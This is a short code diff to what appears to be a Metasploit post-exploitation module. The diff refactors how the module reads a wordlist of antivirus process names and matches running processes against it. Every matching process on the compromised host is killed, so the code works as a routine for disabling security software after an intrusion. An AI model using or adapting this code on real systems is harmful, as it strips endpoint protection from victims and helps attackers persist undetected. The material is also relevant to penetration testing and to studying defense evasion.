@@ -23,10 +23,10 @@ class Metasploit3 < Msf::Post
 
   def run
 
-avs = ::File.read(::File.join(Msf::Config.data_directory, "/wordlists/av_list.txt"))
+  avs = ::File.read(::File.join(Msf::Config.data_directory, 'wordlists', 'av_list.txt'))
 
    client.sys.process.get_processes().each do |x|
-     if (avs.index(x['name'].downcase))
+       if avs.include?(x['name'].downcase)
        print_status("Killing off #{x['name']}...")
        client.sys.process.kill(x['pid'])
      end
